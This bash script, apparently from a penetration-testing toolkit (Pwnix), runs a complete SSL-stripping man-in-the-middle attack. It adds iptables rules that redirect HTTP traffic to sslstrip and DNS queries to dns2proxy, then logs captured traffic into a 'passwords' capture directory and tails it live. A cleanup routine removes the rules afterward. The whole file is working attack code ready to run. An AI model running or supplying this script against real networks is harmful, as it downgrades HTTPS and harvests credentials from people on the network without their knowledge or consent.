#!/bin/bash
# SSL strip script for sniffing on available interfaces
#set the prompt to the name of the script
PS1=${PS1//@\\h/@sslstrip}
clear

#this block controls the features for px_interface_selector
include_cell=1
require_ip=1
default_interface="at0"
. /opt/pwnix/pwnpad-scripts/px_functions.sh

# Cleanup function to ensure sslstrip stops and iptable rules stop
f_clean_up(){
  printf "\n[!] Shutting down sslstrip...\n"
  if [ -n "${sslstrippid}" ]; then
    printf "killing sslstrip[${sslstrippid}]\n"
    kill ${sslstrippid} &> /dev/null
  fi
  if [ -n "${dns2proxypid}" ]; then
    printf "killing dns2proxy[${dns2proxypid}]\n"
    kill -2 ${dns2proxypid} &> /dev/null
  fi

  printf "flushing iptables\n"
  # Remove SSL Strip iptables rule ONLY
  iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8888
  iptables -t nat -D PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
  printf "Shutdown complete\n\n"
  cd "${LOGDIR}" &> /dev/null
  trap - TERM SIGHUP
}

# Setup iptables for sslstrip
f_ip_tables(){
  iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8888
  iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
}

f_run(){
  # Path to sslstrip definitions
  printf "\nLogs saved to ${LOGDIR}\n\n"
  sleep 2

  f_interface
  trap f_clean_up INT
  trap f_clean_up TERM
  trap f_clean_up SIGHUP

  f_ip_tables

  logfile="${LOGDIR}"/sslstrip_$(date +%F-%H%M).log

  if [ -d "/usr/share/mana-toolkit/sslstrip-hsts/dns2proxy" ]; then
    dns2proxy_path=/usr/share/mana-toolkit/sslstrip-hsts/dns2proxy
    int_syntax="-i "
  else
    dns2proxy_path=/usr/share/mana-toolkit/sslstrip-hsts
    int_syntax=""
  fi

  if [ -r "${dns2proxy_path}/dns2proxy.py" ]; then
    cd "${dns2proxy_path}"
    python "${dns2proxy_path}/dns2proxy.py" "${int_syntax}"${interface} > /dev/null 2>&1 &
    dns2proxypid=$!
    disown
    printf "dns2proxy by LeonardoNVE is running...\n"
  else
    printf "dns2proxy is currently unavailable\n"
  fi
  /usr/bin/sslstrip -pfk -w "${logfile}" -l 8888 ${interface} > /dev/null 2>&1 &
  sslstrippid=$!
  printf "sslstrip 0.9 by Moxie Marlinespike running...\n"
  printf "tailing log file, ^c to quit and shut down attack.\n"

  sleep 3
  tail -f "${logfile}"
}

LOGDIR="/opt/pwnix/captures/passwords"
f_run
f_clean_up
